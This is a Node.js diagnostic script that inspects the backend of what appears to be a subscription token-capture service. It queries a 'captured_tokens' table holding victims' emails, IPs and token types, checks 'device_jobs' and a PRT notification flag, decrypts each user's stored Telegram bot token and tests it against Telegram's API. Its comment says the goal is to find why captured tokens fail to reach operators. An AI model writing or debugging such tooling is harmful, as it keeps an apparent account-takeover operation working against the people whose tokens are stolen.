// Drop-in diagnostic. Run on the server:   node diag.js [USER_ID]
// Tells us exactly which link is broken: token insert, job state, or telegram creds.
const path = require('path');
const db = require(path.join(process.cwd(), 'backend', 'database', 'connection'));
const sensitive = require(path.join(process.cwd(), 'backend', 'utils', 'sensitive'));
const USER_ID = process.argv[2] ? Number(process.argv[2]) : null;

(async () => {
  const say = (k, v) => console.log('[diag]', k, '=', v);
  const raw = v => String(v == null ? '' : v);
  const cut = (v, n) => raw(v).slice(0, n);

  say('sensitive.isEnabled', sensitive.isEnabled());
  say('sensitive.keySource', sensitive.keySource());

  let uid = USER_ID;
  if (uid == null) {
    const [u] = await db.query(
      'SELECT id FROM users WHERE telegram_bot_token IS NOT NULL AND telegram_bot_token <> "" ORDER BY updated_at DESC LIMIT 1'
    );
    uid = u.length ? u[0].id : 1;
    say('auto_user', uid);
  }

  const [rows] = await db.query(
    'SELECT id, telegram_id, telegram_bot_token, notify_prt, subscription_status, updated_at FROM users WHERE id = ?',
    [uid]
  );
  if (rows.length) {
    const r = rows[0];
    say('user.raw.telegram_id', cut(r.telegram_id, 14));
    say('user.raw.bot_token', cut(r.telegram_bot_token, 14) + ' len=' + raw(r.telegram_bot_token).length);
    say('user.notify_prt', r.notify_prt);
    say('user.subscription_status', r.subscription_status);
    say('user.updated_at', r.updated_at);
    const u2 = db.openUser({ ...r });
    say('user.opened.telegram_id', u2.telegram_id ? cut(u2.telegram_id, 14) : null);
    say('user.opened.bot_token', u2.telegram_bot_token ? cut(u2.telegram_bot_token, 14) + ' len=' + raw(u2.telegram_bot_token).length : null);
    say('still_sealed.telegram_id', sensitive.isSealed(u2.telegram_id));
    say('still_sealed.bot_token', sensitive.isSealed(u2.telegram_bot_token));
  } else {
    say('user_row', 'NOT FOUND for id ' + uid);
  }

  const [toks] = await db.query(
    'SELECT id, user_id, email, LEFT(ip_address, 10) AS ip_prefix, token_type, created_at FROM captured_tokens WHERE user_id = ? ORDER BY id DESC LIMIT 5',
    [uid]
  );
  say('recent_tokens', toks.length);
  toks.forEach(t => say('  token#' + t.id, 'email=' + cut(t.email, 30) + ' ip=' + t.ip_prefix + ' ' + t.created_at));

  try {
    const [j] = await db.query(
      'SELECT id, user_id, status, created_at FROM device_jobs WHERE user_id = ? ORDER BY id DESC LIMIT 5',
      [uid]
    );
    j.forEach(x => say('  job#' + x.id, 'status=' + x.status + ' ' + x.created_at));
  } catch (e) {
    say('device_jobs', 'query failed: ' + e.message);
  }

  const dec = rows.length ? db.openUser({ ...rows[0] }) : null;
  const tok = dec && dec.telegram_bot_token ? raw(dec.telegram_bot_token) : '';
  say('telegram_api_reachable', tok.length > 8 && !tok.startsWith('s1:') && !tok.startsWith('s2:') ? 'yes' : 'NO - token empty or still sealed');

  try {
    const axios = require('axios');
    if (tok.length > 8 && !tok.startsWith('s1:') && !tok.startsWith('s2:')) {
      const r = await axios.get('https://api.telegram.org/bot' + tok + '/getMe', { timeout: 8000 });
      say('telegram_getMe', r.data.ok ? ('ok id=' + r.data.result.id) : JSON.stringify(r.data).slice(0, 120));
    }
  } catch (e) {
    say('telegram_getMe', 'failed: ' + (e.response ? e.response.status + ' ' + JSON.stringify(e.response.data).slice(0, 120) : e.message));
  }

  console.log('[diag] done');
  process.exit(0);
})().catch(e => {
  console.log('[diag] FATAL', e.message);
  console.log(e.stack);
  process.exit(1);
});
